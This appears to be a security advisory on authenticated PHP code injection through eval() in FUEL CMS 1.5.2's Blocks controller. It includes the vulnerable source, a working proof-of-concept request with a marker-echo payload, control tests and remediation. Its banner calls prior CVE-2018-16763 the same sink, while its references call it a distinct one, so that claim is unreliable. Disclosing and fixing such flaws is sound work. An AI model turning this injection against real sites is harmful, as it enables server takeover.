# FUEL CMS PHP Code Injection (1.5.2)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**CVE-2018-16763 (VulDB 描述即 Blocks.php layout_fields eval — 同 sink)**。本目录仅作研究存档,不提交 VulDB。
**CWE-94 · Authenticated (admin session) · Arbitrary PHP code execution via `name` GET parameter in Blocks::layout_fields()**

> **Vendor:** daylightstudio (Daylight Studio)
> **Product:** FUEL CMS (CodeIgniter 3.1.13)
> **Affected version:** 1.5.2 (master branch, commit 6fd06d4)
> **Affected endpoints:** `GET /index.php/fuel/blocks/layout_fields/<layout>/<non-empty-id>?name=<payload>` (FUEL admin area)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

`Blocks::layout_fields()` (`fuel/modules/fuel/controllers/Blocks.php:179-265`) builds a PHP statement by string-concatenating the user-controlled `name` GET parameter and executes it with `@eval()` (line 264). The `name` value passes only CodeIgniter's XSS filter (`$this->input->get('name', TRUE)`, line 197), which does not sanitize PHP code. With a valid FUEL admin session this yields arbitrary PHP code execution on the host. Two structural preconditions apply (verified): the eval sits inside the `if (!empty($id))` branch, so the URI must contain a **non-empty `:id` segment** after the layout name, and the site must have **at least one block layout registered** in `$config['blocks']` (the documented, standard configuration of the Blocks module).

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `fuel/modules/fuel/controllers/Blocks.php` | 197 | `$_name = $this->input->get('name', TRUE)` — XSS filter only, no PHP-code sanitization |
| `fuel/modules/fuel/controllers/Blocks.php` | 256-258 | `explode('--', $_name)` → `end()` → bracket-only `str_replace` (no code filtering) |
| `fuel/modules/fuel/controllers/Blocks.php` | 253 | `if ( ! empty($id))` — the eval branch; requires a non-empty `:id` URI segment |
| `fuel/modules/fuel/controllers/Blocks.php` | 263-264 | statement built by concatenation and executed: `@eval($_name_var_eval)` |

```php
// L253: reached only when the URI segment :id is non-empty
if ( ! empty($id))
{
    ...
    // extract variables
    extract($page_vars);
    $name_parts = explode('--', $_name);
    $_name = end($name_parts);
    $_name_var = str_replace(array('[', ']'), array('["', '"]'), $_name);   // L257: brackets only

    if ( ! empty($_name_var))
    {
        $_name_var_eval = '@$_name = (isset($'.$_name_var.')) ? $'.$_name_var.' : "";';
        @eval($_name_var_eval);                                            // L264: arbitrary PHP
    }
```

The input chain: GET `name` → `input->get('name', TRUE)` (XSS filter only) → `explode('--')`/`end()` → bracket `str_replace` → concatenation into the eval string. Nothing in the chain restricts the value to a variable name.

## 3. Prerequisites

1. **Valid FUEL admin session** with Blocks module access (Fuel_base_controller auth gate). The shipped installer schema (`fuel/install/fuel_schema.sql`, `fuel_users` insert) seeds a default super-admin account (`user_name` `admin`); sites that keep the default password are immediately exposed. Locally the password was set to a throwaway value (`<REDACTED>`).
2. **At least one block layout registered** in `$config['blocks']` (`application/config/MY_fuel_layouts.php`) — the standard, documented way to configure the Blocks module (see the bundled Blocks-module docs). Without any registered block layout, `layout_fields()` returns before reaching the eval. The verification used a layout named `verify_block`.
3. **A non-empty `:id` URI segment** (e.g. `/layout_fields/verify_block/1`) — the eval is inside the `if (!empty($id))` branch; any non-empty value works.

## 4. Reproduction

Login (CSRF token taken from the login form), then request:

```http
GET /index.php/fuel/blocks/layout_fields/verify_block/1?name=a)); echo("FUELEVAL-".md5("fuel-poc")); // HTTP/1.1
Cookie: <admin session cookie>
```

The eval string becomes:

```php
@$_name = (isset($a)); echo("FUELEVAL-".md5("fuel-poc")); //)) ? $a)); ... : "";
```

(everything after `//` is a line comment). Response: HTTP 200 with the page body containing:

```
FUELEVAL-5dfc072c655ea55ead079f0cb689c4ce
```

`md5("fuel-poc") = 5dfc072c655ea55ead079f0cb689c4ce` (computed independently) — arbitrary PHP code executed. The payload only echoes an md5 marker; no `system()`/shell calls were used.

## 5. Confirmed Techniques

- With admin session + layout + `:id` segment + `name` payload → marker echoed (eval executed).
- Control A — no session cookie: HTTP 302 redirect to `/fuel/login/...`, no evaluation (auth gate confirmed).
- Control B — same payload **without** the `:id` segment (`/layout_fields/verify_block?name=...`): HTTP 200 normal field-form render, **no marker** (eval branch requires non-empty `$id`).
- Control C — `:id` present but no `name` parameter: HTTP 200 normal render, no user input evaluated.

## 6. Impact

Arbitrary PHP code execution under the web server identity for any holder of an admin session — full compromise of the CMS host (file access, database credentials in `database.php`, further pivoting). Practically this converts any admin-session theft (default seeded `admin` account left unchanged, session hijack, CSRF-adjacent attacks) into server takeover. No credential values are reproduced here; the locally verified password is `<REDACTED>`.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.7 High)

## 8. Remediation

- Replace the `eval()` with a strict variable-name whitelist check, e.g. `preg_match('/^[a-z_][a-z0-9_]*$/i', $_name_var)`, and reject anything else.
- Alternatively parse the expression with a safe evaluator instead of `eval()`.
- Keep the existing auth gate but treat `name` as untrusted data, never as code.

## 9. References

- Project: https://github.com/daylightstudio/FUEL-CMS
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- Related prior advisory (distinct sink): CVE-2018-16763 (Fuel_page.php page rendering/preview)
- External disclosure: https://gist.github.com/qianqiusujiu/36cc837bc03bb724a3b70217e407ab42
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
